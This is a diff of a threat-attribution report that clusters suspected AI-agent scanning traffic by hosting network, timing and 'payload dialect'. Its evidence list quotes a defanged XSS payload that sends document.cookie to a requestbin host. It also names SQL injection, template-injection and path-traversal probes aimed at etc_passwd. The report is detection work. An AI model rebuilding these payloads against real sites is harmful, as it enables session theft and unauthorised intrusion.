@@ -87,7 +87,7 @@ Each claim gives its layer, label (Confirmed, Suspected, Possible, Unattributed)
 
 - **Amazon AWS** (hosting network). 3 record(s) sent from AS16509; 8 record(s) sent from AS16509; 5 record(s) sent from AS16509. Label: Suspected; tag: Observed. A host is not necessarily the developer.
 - **DigitalOcean** (hosting network). 3 record(s) sent from AS14061; 5 record(s) sent from AS14061. Label: Suspected; tag: Observed. A host is not necessarily the developer.
-- **1.1 runtime** (hosting network). 1 record(s) carry the runtime marker `via: 1.1 edge (apachetrafficserver/9.2)` (rule header.via_ats). Label: Suspected; tag: Observed. A host is not necessarily the developer.
+- **runtime marked by header.via_ats** (hosting network). 1 record(s) carry the runtime marker `via: 1.1 edge (apachetrafficserver/9.2)` (rule header.via_ats). Label: Suspected; tag: Observed. A host is not necessarily the developer.
 - Some requests name a model or vendor. That is not attribution: agents misreport who built them, and anyone can submit such a string to a public scanner.
 
 **Harness and framework candidates** (ranked; never named as the source in public):
@@ -273,7 +273,7 @@ Every flagged request to each host, including requests outside the linked cluste
   - iterative probing: 3 variants of `id` on `records[.]agency[.]example/api/items` over 45s (median gap 25s, model pace)
   - payload dialect `3da130c5` over 2 records: sqli (union_select ×2). Which canonical test payloads a client reaches for is consistent with one model or tool, not evidence on its own
 - **C21** (significant): 3 records, 1 run(s), 2026-08-03 15:30:00 UTC → 2026-08-03 15:32:00 UTC, median gap 60s
-  - iterative probing: 3 variants of `cube`, `include` on `api[.]datausa[.]io/tesseract/data.jsonrecords` over 2m (median gap 60s, model pace)
+  - iterative probing: 3 variants of `cube`, `include` on `api[.]datausa[.]io/tesseract/data[.]jsonrecords` over 2m (median gap 60s, model pace)
   - payload dialect `bf957942` over 2 records: ssti (double_brace ×1); traversal (depth2 ×1, etc_passwd ×1); first seen ssti.double_brace → traversal.depth2 → traversal.etc_passwd. Which canonical test payloads a client reaches for is consistent with one model or tool, not evidence on its own
 - **C22** (significant): 3 records, 2 run(s), 2026-08-05 10:00:00 UTC → 2026-08-07 13:00:00 UTC, median gap 2.1d
   - linked by: `param:uqtag=covrun7`
@@ -363,7 +363,7 @@ Every flagged request to each host, including requests outside the linked cluste
 
 URLs are defanged. Records are listed by evidence strength.
 
-1. 2026-08-07 12:00:00 UTC: `hxxps://records[.]agency[.]example/search?q=%3Cscript%3Efetch(%27//c0ve7x9[.]m[.]pipedream[.]net/?c=%27%2Bdocument.cookie)%3C/script%3E`
+1. 2026-08-07 12:00:00 UTC: `hxxps://records[.]agency[.]example/search?q=%3Cscript%3Efetch(%27//c0ve7x9[.]m[.]pipedream[.]net/?c=%27%2Bdocument[.]cookie)%3C/script%3E`
    - rules: carrier.inline_fetch_program, carrier.html_program, exfil.requestbin, exfil.cookie, exploit.xss
 1. 2026-08-13 09:00:00 UTC: `hxxps://app[.]scrapingbee[.]com/api/v1/?api_key=YOUR_API_KEY&url=https%3A%2F%2Frecords[.]agency[.]example%2Fitems%3Fid%3D1%2527`
    - rules: relay.scrape_api, marker.placeholder, exploit.double_encoded_meta, exploit.sqli_quote
